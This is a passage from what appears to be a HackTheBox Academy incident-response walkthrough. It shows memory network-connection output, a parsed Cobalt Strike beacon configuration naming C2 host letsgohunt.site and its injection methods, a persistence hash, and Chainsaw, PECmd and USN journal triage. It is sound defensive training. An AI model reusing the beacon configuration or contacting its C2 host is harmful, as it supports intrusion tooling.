0x800ae1f1acc0  UDPv4   0.0.0.0 64515   *       0               1584    dasHost.exe     2023-08-10 00:23:44.000000
0x800ae1f1acc0  UDPv6   ::      64515   *       0               1584    dasHost.exe     2023-08-10 00:23:44.000000
0x800ae1f3c4b0  UDPv4   0.0.0.0 4500    *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1f3ddb0  UDPv4   0.0.0.0 0       *       0               440     svchost.exe     2023-08-10 00:24:58.000000
0x800ae1f401a0  UDPv4   0.0.0.0 0       *       0               440     svchost.exe     2023-08-10 00:24:59.000000
0x800ae1f401a0  UDPv6   ::      0       *       0               440     svchost.exe     2023-08-10 00:24:59.000000
0x800ae1f41910  UDPv4   0.0.0.0 0       *       0               8024    svchost.exe     2023-08-10 00:24:59.000000
0x800ae21ac1e0  TCPv4   192.168.152.134 52834   142.250.203.202 443     ESTABLISHED     2784    chrome.exe      2023-08-10 09:33:45.000000
0x800ae21ae320  TCPv4   192.168.152.134 49712   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae2202300  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae2202300  UDPv6   ::      3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae2202490  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae2202940  UDPv4   0.0.0.0 5353    *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae2202940  UDPv6   ::      5353    *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae2202c60  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae2202c60  UDPv6   ::      5355    *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae22032a0  UDPv4   0.0.0.0 5353    *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae2203430  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae22038e0  UDPv4   0.0.0.0 63078   *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae22038e0  UDPv6   ::      63078   *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae2203a70  UDPv4   192.168.152.134 137     *       0               4       System  2023-08-10 09:10:18.000000
0x800ae2203c00  UDPv4   0.0.0.0 0       *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae2203c00  UDPv6   ::      0       *       0               1272    svchost.exe     2023-08-10 09:10:18.000000
0x800ae2203d90  UDPv4   0.0.0.0 0       *       0               4492    chrome.exe      2023-08-10 09:23:50.000000
0x800ae2203d90  UDPv6   ::      0       *       0               4492    chrome.exe      2023-08-10 09:23:50.000000
0x800ae22040b0  UDPv4   0.0.0.0 0       *       0               4492    chrome.exe      2023-08-10 09:23:50.000000
0x800ae22043d0  UDPv4   192.168.152.134 138     *       0               4       System  2023-08-10 09:10:18.000000
0x800ae2204560  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae2204560  UDPv6   ::      3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae2204880  UDPv4   0.0.0.0 63077   *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae2204a10  UDPv4   0.0.0.0 0       *       0               4492    chrome.exe      2023-08-10 09:23:50.000000
0x800ae2204a10  UDPv6   ::      0       *       0               4492    chrome.exe      2023-08-10 09:23:50.000000
0x800ae2205050  UDPv4   0.0.0.0 3702    *       0               1584    dasHost.exe     2023-08-10 09:10:17.000000
0x800ae22051e0  UDPv4   0.0.0.0 0       *       0               4492    chrome.exe      2023-08-10 09:23:50.000000
0x800ae23cfa20  TCPv4   192.168.152.134 49720   20.42.65.90     443     CLOSED  2440    WWAHost.exe     2023-08-10 00:24:14.000000
0x800ae25dba20  TCPv4   192.168.152.134 49709   96.16.54.99     443     CLOSE_WAIT      2440    WWAHost.exe     2023-08-10 00:24:11.000000
0x800ae26a5050  TCPv4   192.168.152.134 52683   142.250.203.202 443     ESTABLISHED     2784    chrome.exe      2023-08-10 09:32:47.000000
0x800ae2d1eb60  TCPv4   192.168.152.134 49856   104.81.60.16    80      CLOSE_WAIT      6908    SkypeApp.exe    2023-08-10 09:10:32.000000
0x800ae41688d0  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:28:55.000000
0x800ae41693c0  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:28:55.000000
0x800ae41693c0  UDPv6   ::      0       *       0               -       -       2023-08-10 00:28:55.000000
0x800ae416c5c0  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:28:55.000000
0x800ae416c5c0  UDPv6   ::      0       *       0               -       -       2023-08-10 00:28:55.000000
0x800ae416d880  UDPv4   0.0.0.0 0       *       0               -       -       2023-08-10 00:28:55.000000
0x800ae418f390  UDPv4   0.0.0.0 5355    *       0               1272    svchost.exe     2023-08-10 00:31:56.000000
0x800ae418f390  UDPv6   ::      5355    *       0               1272    svchost.exe     2023-08-10 00:31:56.000000
```

## Disk Image/Rapid Triage Data Examination & Analysis

#### Searching for Keywords with Autopsy

![https://academy.hackthebox.com/storage/modules/237/image78.png](https://academy.hackthebox.com/storage/modules/237/image78.png)

![https://academy.hackthebox.com/storage/modules/237/image32.png](https://academy.hackthebox.com/storage/modules/237/image32.png)

![https://academy.hackthebox.com/storage/modules/237/image57.png](https://academy.hackthebox.com/storage/modules/237/image57.png)

#### Identifying Web Download Information & Extracting Files with Autopsy

![https://academy.hackthebox.com/storage/modules/237/image87.png](https://academy.hackthebox.com/storage/modules/237/image87.png)

![https://academy.hackthebox.com/storage/modules/237/image21.png](https://academy.hackthebox.com/storage/modules/237/image21.png)

![https://academy.hackthebox.com/storage/modules/237/image9_.png](https://academy.hackthebox.com/storage/modules/237/image9_.png)

![https://academy.hackthebox.com/storage/modules/237/image91.png](https://academy.hackthebox.com/storage/modules/237/image91.png)

#### Extracting Cobalt Strike Beacon Configuration

``` cmd-session
C:\Users\johndoe\Desktop\CobaltStrikeParser-master\CobaltStrikeParser-master>python parse_beacon_config.py E:\payload.dll
BeaconType                       - HTTP
Port                             - 80
SleepTime                        - 60000
MaxGetSize                       - 1048576
Jitter                           - 0
MaxDNS                           - Not Found
PublicKey_MD5                    - 1a5779a38fe8b146455e5bf476e39812
C2Server                         - letsgohunt.site,/load
UserAgent                        - Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MASP)
HttpPostUri                      - /submit.php
Malleable_C2_Instructions        - Empty
HttpGet_Metadata                 - Metadata
                                        base64
                                        header "Cookie"
HttpPost_Metadata                - ConstHeaders
                                        Content-Type: application/octet-stream
                                   SessionId
                                        parameter "id"
                                   Output
                                        print
PipeName                         - Not Found
DNS_Idle                         - Not Found
DNS_Sleep                        - Not Found
SSH_Host                         - Not Found
SSH_Port                         - Not Found
SSH_Username                     - Not Found
SSH_Password_Plaintext           - Not Found
SSH_Password_Pubkey              - Not Found
SSH_Banner                       -
HttpGet_Verb                     - GET
HttpPost_Verb                    - POST
HttpPostChunk                    - 0
Spawnto_x86                      - %windir%\syswow64\rundll32.exe
Spawnto_x64                      - %windir%\sysnative\rundll32.exe
CryptoScheme                     - 0
Proxy_Config                     - Not Found
Proxy_User                       - Not Found
Proxy_Password                   - Not Found
Proxy_Behavior                   - Use IE settings
Watermark_Hash                   - Not Found
Watermark                        - 0
bStageCleanup                    - False
bCFGCaution                      - False
KillDate                         - 0
bProcInject_StartRWX             - True
bProcInject_UseRWX               - True
bProcInject_MinAllocSize         - 0
ProcInject_PrependAppend_x86     - Empty
ProcInject_PrependAppend_x64     - Empty
ProcInject_Execute               - CreateThread
                                   SetThreadContext
                                   CreateRemoteThread
                                   RtlCreateUserThread
ProcInject_AllocationMethod      - VirtualAllocEx
bUsesCookies                     - True
HostHeader                       -
headersToRemove                  - Not Found
DNS_Beaconing                    - Not Found
DNS_get_TypeA                    - Not Found
DNS_get_TypeAAAA                 - Not Found
DNS_get_TypeTXT                  - Not Found
DNS_put_metadata                 - Not Found
DNS_put_output                   - Not Found
DNS_resolver                     - Not Found
DNS_strategy                     - round-robin
DNS_strategy_rotate_seconds      - -1
DNS_strategy_fail_x              - -1
DNS_strategy_fail_seconds        - -1
Retry_Max_Attempts               - Not Found
Retry_Increase_Attempts          - Not Found
Retry_Duration                   - Not Found
```

#### Identifying Persistence with Autoruns

![https://academy.hackthebox.com/storage/modules/237/image2__.png](https://academy.hackthebox.com/storage/modules/237/image2__.png)

``` powershell-session
PS C:\Users\johndoe> Get-FileHash -Algorithm SHA256 "C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Users\johndoe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\photo443.exe"

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          E986DAA66F2E8E4C47E8EAA874FCD4DCAB8045F1F727DAF7AC15843101385194       C:\Users\johndoe\Desktop\kape...
```

![https://academy.hackthebox.com/storage/modules/237/image79.png](https://academy.hackthebox.com/storage/modules/237/image79.png)

![https://academy.hackthebox.com/storage/modules/237/image22.png](https://academy.hackthebox.com/storage/modules/237/image22.png)

![https://academy.hackthebox.com/storage/modules/237/image94.png](https://academy.hackthebox.com/storage/modules/237/image94.png)

![https://academy.hackthebox.com/storage/modules/237/image69.png](https://academy.hackthebox.com/storage/modules/237/image69.png)

#### Analyzing MFT Data with Autopsy

![https://academy.hackthebox.com/storage/modules/237/image54.png](https://academy.hackthebox.com/storage/modules/237/image54.png)

![https://academy.hackthebox.com/storage/modules/237/image5__.png](https://academy.hackthebox.com/storage/modules/237/image5__.png)

#### Analyzing SRUM Data with Autopsy

![https://academy.hackthebox.com/storage/modules/237/image61.png](https://academy.hackthebox.com/storage/modules/237/image61.png)

![https://academy.hackthebox.com/storage/modules/237/image42.png](https://academy.hackthebox.com/storage/modules/237/image42.png)

![https://academy.hackthebox.com/storage/modules/237/image40.png](https://academy.hackthebox.com/storage/modules/237/image40.png)

![https://academy.hackthebox.com/storage/modules/237/image18.png](https://academy.hackthebox.com/storage/modules/237/image18.png)

#### Analyzing Rapid Triage Data - Windows Event Logs (Chainsaw)

``` cmd-session
C:\Users\johndoe>cd C:\Users\johndoe\Desktop\chainsaw
C:\Users\johndoe\Desktop\chainsaw>chainsaw_x86_64-pc-windows-msvc.exe hunt "..\kapefiles\auto\C%3A\Windows\System32\winevt\Logs" -s sigma/ --mapping mappings/sigma-event-logs-all.yml -r rules/ --csv --output output_csv

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading detection rules from: rules/, sigma/
[!] Loaded 2872 detection rules (329 not loaded)
[+] Loading forensic artefacts from: ..\kapefiles\auto\C%3A\Windows\System32\winevt\Logs (extensions: .evt, .evtx)
[+] Loaded 142 forensic artefacts (66.6 MB)
[+] Hunting: [========================================] 142/142 -                                                       [+] Created account_tampering.csv
[+] Created antivirus.csv
[+] Created sigma.csv

[+] 2212 Detections found on 1809 documents
```

![https://academy.hackthebox.com/storage/modules/237/image86.png](https://academy.hackthebox.com/storage/modules/237/image86.png)

![https://academy.hackthebox.com/storage/modules/237/image77.png](https://academy.hackthebox.com/storage/modules/237/image77.png)

![https://academy.hackthebox.com/storage/modules/237/image98.png](https://academy.hackthebox.com/storage/modules/237/image98.png)

![https://academy.hackthebox.com/storage/modules/237/image41.png](https://academy.hackthebox.com/storage/modules/237/image41.png)

![https://academy.hackthebox.com/storage/modules/237/image29.png](https://academy.hackthebox.com/storage/modules/237/image29.png)

![https://academy.hackthebox.com/storage/modules/237/image76.png](https://academy.hackthebox.com/storage/modules/237/image76.png)

![https://academy.hackthebox.com/storage/modules/237/image70.png](https://academy.hackthebox.com/storage/modules/237/image70.png)

![https://academy.hackthebox.com/storage/modules/237/image17.png](https://academy.hackthebox.com/storage/modules/237/image17.png)

![https://academy.hackthebox.com/storage/modules/237/60_.png](https://academy.hackthebox.com/storage/modules/237/60_.png)

![https://academy.hackthebox.com/storage/modules/237/image95.png](https://academy.hackthebox.com/storage/modules/237/image95.png)

![https://academy.hackthebox.com/storage/modules/237/image35.png](https://academy.hackthebox.com/storage/modules/237/image35.png)

#### Analyzing Rapid Triage Data - Prefetch Files (PECmd)

``` cmd-session
C:\Users\johndoe>C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6\PECmd.exe -d "C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\Prefetch" -q --csv C:\Users\johndoe\Desktop --csvf suspect_prefetch.csv
PECmd version 1.5.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/PECmd

Command line: -d C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\Prefetch -q --csv C:\Users\johndoe\Desktop --csvf suspect_prefetch.csv

Warning: Administrator privileges not found!

Keywords: temp, tmp

Looking for prefetch files in C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\Prefetch


Found 192 Prefetch files

---------- Processed C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\Prefetch\7Z.EXE-7FD2B543.pf in 0.01905280 seconds ----------
---------- Processed C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\Prefetch\8EA5559.EXE-F1260DBD.pf in 0.00101580 seconds ----------
---------- Processed C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\Prefetch\ADVANCED_IP_SCANNER_CONSOLE.E-1287F9BF.pf in 0.00139640 seconds ----------
---------- Processed C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\Prefetch\APPLICATIONFRAMEHOST.EXE-8CE9A1EE.pf in 0.00144550 seconds ----------
---------- Processed C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\Prefetch\ARP.EXE-ED14DF84.pf in 0.00088350 seconds ----------
---------- Processed C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\Prefetch\AUDIODG.EXE-AB22E9A6.pf in 0.00128900 seconds ----------
---SNIP---

Processed 192 out of 192 files in 1.7305 seconds

CSV output will be saved to C:\Users\johndoe\Desktop\suspect_prefetch.csv
CSV time line output will be saved to C:\Users\johndoe\Desktop\suspect_prefetch_Timeline.csv
```

![https://academy.hackthebox.com/storage/modules/237/image96.png](https://academy.hackthebox.com/storage/modules/237/image96.png)

#### Analyzing Rapid Triage Data - USN Journal (usn.py)

``` cmd-session
C:\Users\johndoe>python C:\Users\johndoe\Desktop\files\USN-Journal-Parser-master\usnparser\usn.py -f C:\Users\johndoe\Desktop\kapefiles\ntfs\%5C%5C.%5CC%3A\$Extend\$UsnJrnl%3A$J -o C:\Users\johndoe\Desktop\usn_output.csv -c
```

``` powershell-session
PS C:\Users\johndoe> $time1 = [DateTime]::ParseExact("2023-08-10 09:00:00.000000", "yyyy-MM-dd HH:mm:ss.ffffff", $null)
PS C:\Users\johndoe> $time2 = [DateTime]::ParseExact("2023-08-10 10:00:00.000000", "yyyy-MM-dd HH:mm:ss.ffffff", $null)
PS C:\Users\johndoe> Import-Csv -Path C:\Users\johndoe\Desktop\usn_output.csv | Where-Object { $_.'FileName' -match '\.exe$|\.txt$|\.msi$|\.bat$|\.ps1$|\.iso$|\.lnk$' } | Where-Object { $_.timestamp -as [DateTime] -ge $time1 -and $_.timestamp -as [DateTime] -lt $time2 }

timestamp                  filename                              fileattr                    reason
---------                  --------                              --------                    ------
2023-08-10 09:10:22.977907 LogFile_August_10_2023__11_10_22.txt  ARCHIVE                     FILE_CREATE
2023-08-10 09:10:22.977907 LogFile_August_10_2023__11_10_22.txt  ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:10:23.071596 SkypeApp0.txt                         ARCHIVE                     DATA_EXTEND
2023-08-10 09:10:23.118786 LogFile_August_10_2023__11_10_22.txt  ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:10:32.210068 connecttest[1].txt                    ARCHIVE NOT_CONTENT_INDEXED FILE_CREATE
2023-08-10 09:10:32.210068 connecttest[1].txt                    ARCHIVE NOT_CONTENT_INDEXED DATA_EXTEND FILE_CREATE
2023-08-10 09:10:32.225077 connecttest[1].txt                    ARCHIVE NOT_CONTENT_INDEXED DATA_EXTEND FILE_CREATE...
2023-08-10 09:10:33.650255 GoogleUpdateSetup.exe                 ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:39.363855 install-velociraptor.ps1              ARCHIVE                     DATA_OVERWRITE
2023-08-10 09:10:39.363855 install-velociraptor.ps1              ARCHIVE                     DATA_OVERWRITE DATA_TRU...
2023-08-10 09:10:39.363855 install-velociraptor.ps1              ARCHIVE                     DATA_OVERWRITE DATA_TRU...
2023-08-10 09:10:43.732710 AppCache133361322434478643.txt        ARCHIVE                     FILE_CREATE
2023-08-10 09:10:43.732710 AppCache133361322434478643.txt        ARCHIVE                     FILE_CREATE CLOSE
2023-08-10 09:10:43.743181 AppCache133361322434478643.txt        ARCHIVE                     RENAME_OLD_NAME
2023-08-10 09:10:43.743181 AppCache133361322434478643.txt        ARCHIVE                     SECURITY_CHANGE RENAME_...
2023-08-10 09:10:43.751455 AppCache133361322434478643.txt        ARCHIVE                     SECURITY_CHANGE RENAME_...
2023-08-10 09:10:44.425482 0.0.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.444506 0.1.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.447359 0.2.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.468023 0.0.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.478762 0.1.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.478762 0.2.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.478762 0.0.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.512413 0.1.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.512413 0.2.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.555315 0.0.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.563446 0.1.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.565619 0.2.filtertrie.intermediate.txt       ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:44.756088 0.0.filtertrie.intermediate.txt       ARCHIVE                     FILE_CREATE
2023-08-10 09:10:44.756088 0.0.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:10:44.767424 0.0.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:10:44.767424 0.1.filtertrie.intermediate.txt       ARCHIVE                     FILE_CREATE
2023-08-10 09:10:44.767424 0.1.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:10:44.767424 0.1.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:10:44.767424 0.2.filtertrie.intermediate.txt       ARCHIVE                     FILE_CREATE
2023-08-10 09:10:44.767424 0.2.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:10:44.767424 0.2.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:10:45.059130 AppCache133361005195598236.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.069775 AppCache133361005206645112.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.069775 AppCache133361005269917324.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.069775 AppCache133361005513698464.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.081799 AppCache133361005867155383.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.135202 AppCache133361005888800278.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.168316 AppCache133361005946835317.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.212048 AppCache133361006139561046.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.233486 AppCache133361006251685172.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.243986 AppCache133361006447497566.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.277279 AppCache133361006548695382.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.287601 AppCache133361006715277919.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.308846 AppCache133361008284645822.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.308846 AppCache133361009397339860.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.330624 AppCache133361009697650140.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.342615 AppCache133361010001588865.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.364286 AppCache133361010307625145.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.372662 AppCache133361010613027226.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.396872 AppCache133361010690000678.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.396872 AppCache133361011174886552.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.419172 AppCache133361011524452213.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:45.419172 AppCache133361011823806355.txt        ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:49.024010 __PSScriptPolicyTest_3jtsun1t.1uk.ps1 ARCHIVE                     FILE_CREATE
2023-08-10 09:10:49.032211 __PSScriptPolicyTest_3jtsun1t.1uk.ps1 ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:10:49.032211 __PSScriptPolicyTest_3jtsun1t.1uk.ps1 ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:10:49.053465 __PSScriptPolicyTest_3jtsun1t.1uk.ps1 ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:10:59.745146 ConsoleHost_history.txt               ARCHIVE                     DATA_EXTEND
2023-08-10 09:10:59.745146 ConsoleHost_history.txt               ARCHIVE                     DATA_EXTEND CLOSE
2023-08-10 09:11:06.902067 ConsoleHost_history.txt               ARCHIVE                     DATA_EXTEND
2023-08-10 09:11:06.902067 ConsoleHost_history.txt               ARCHIVE                     DATA_EXTEND CLOSE
2023-08-10 09:11:10.448160 ConsoleHost_history.txt               ARCHIVE                     DATA_EXTEND
2023-08-10 09:11:10.448160 ConsoleHost_history.txt               ARCHIVE                     DATA_EXTEND CLOSE
2023-08-10 09:11:12.698204 velociraptor.msi                      ARCHIVE                     FILE_CREATE
2023-08-10 09:11:12.698204 velociraptor.msi                      ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:11:13.167118 velociraptor.msi                      ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:11:13.385654 eded2.msi                             ARCHIVE                     FILE_CREATE
2023-08-10 09:11:13.385654 eded2.msi                             ARCHIVE                     FILE_CREATE CLOSE
2023-08-10 09:11:13.385654 eded2.msi                             ARCHIVE                     DATA_TRUNCATION
2023-08-10 09:11:13.385654 eded2.msi                             ARCHIVE                     DATA_TRUNCATION SECURIT...
2023-08-10 09:11:13.385654 eded2.msi                             ARCHIVE                     DATA_EXTEND DATA_TRUNCA...
2023-08-10 09:11:13.385654 eded2.msi                             ARCHIVE                     DATA_OVERWRITE DATA_EXT...
2023-08-10 09:11:13.401651 eded2.msi                             ARCHIVE                     DATA_OVERWRITE DATA_EXT...
2023-08-10 09:11:13.401651 eded2.msi                             ARCHIVE                     DATA_OVERWRITE DATA_EXT...
2023-08-10 09:11:13.760586 Config.Msi                            HIDDEN SYSTEM DIRECTORY     SECURITY_CHANGE
2023-08-10 09:11:13.760586 Config.Msi                            HIDDEN SYSTEM DIRECTORY     SECURITY_CHANGE CLOSE
2023-08-10 09:11:13.823160 Velociraptor.exe                      ARCHIVE                     FILE_CREATE
2023-08-10 09:11:13.823160 Velociraptor.exe                      ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:11:13.823160 Velociraptor.exe                      ARCHIVE                     DATA_OVERWRITE DATA_EXT...
2023-08-10 09:11:14.073687 Velociraptor.exe                      ARCHIVE                     DATA_OVERWRITE DATA_EXT...
2023-08-10 09:11:14.292759 Velociraptor.exe                      ARCHIVE                     DATA_OVERWRITE DATA_EXT...
2023-08-10 09:11:15.755735 eded5.msi                             ARCHIVE                     FILE_CREATE
2023-08-10 09:11:15.755735 eded5.msi                             ARCHIVE                     FILE_CREATE CLOSE
2023-08-10 09:11:15.755735 eded5.msi                             ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:15.755735 eded5.msi                             ARCHIVE                     FILE_CREATE
2023-08-10 09:11:15.755735 eded5.msi                             ARCHIVE                     FILE_CREATE SECURITY_CH...
2023-08-10 09:11:15.755735 eded5.msi                             ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:11:15.755735 eded5.msi                             ARCHIVE                     DATA_OVERWRITE DATA_EXT...
2023-08-10 09:11:15.770645 eded5.msi                             ARCHIVE                     DATA_OVERWRITE DATA_EXT...
2023-08-10 09:11:15.770645 eded5.msi                             ARCHIVE                     DATA_OVERWRITE DATA_EXT...
2023-08-10 09:11:15.801901 Config.Msi                            HIDDEN SYSTEM DIRECTORY     SECURITY_CHANGE
2023-08-10 09:11:15.801901 Config.Msi                            HIDDEN SYSTEM DIRECTORY     SECURITY_CHANGE CLOSE
2023-08-10 09:11:15.864338 eded2.msi                             ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.400902 disable-defender.ps1                  ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.416906 enable_powershell_logging.ps1         ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.416906 LGPO.exe                              ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.416906 README.txt                            ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.557188 install-choco-extras.ps1              ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.557188 install-utilities.ps1                 ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.588585 chocolateyInstall.ps1                 ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.588585 chocolateyUninstall.ps1               ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.604036 install-autorunstowineventlog.ps1     ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.604036 install-sysinternals.ps1              ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.604036 AutorunsToWinEventLog.ps1             ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.604036 Install.ps1                           ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.604036 Uninstall.ps1                         ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.619732 install-velociraptor.ps1              ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.619732 fix-windows-expiration.ps1            ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:24.635321 WindowsPrivacy.ps1                    ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:11:26.888485 AppCache133361322867582467.txt        ARCHIVE                     FILE_CREATE
2023-08-10 09:11:26.888485 AppCache133361322867582467.txt        ARCHIVE                     FILE_CREATE CLOSE
2023-08-10 09:11:26.903942 AppCache133361322867582467.txt        ARCHIVE                     RENAME_OLD_NAME
2023-08-10 09:11:26.903942 AppCache133361322867582467.txt        ARCHIVE                     SECURITY_CHANGE RENAME_...
2023-08-10 09:11:26.903942 AppCache133361322867582467.txt        ARCHIVE                     SECURITY_CHANGE RENAME_...
2023-08-10 09:11:27.157166 0.0.filtertrie.intermediate.txt       ARCHIVE                     FILE_CREATE
2023-08-10 09:11:27.157166 0.0.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:11:27.157166 0.0.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:11:27.157166 0.1.filtertrie.intermediate.txt       ARCHIVE                     FILE_CREATE
2023-08-10 09:11:27.157166 0.1.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:11:27.157166 0.1.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE...
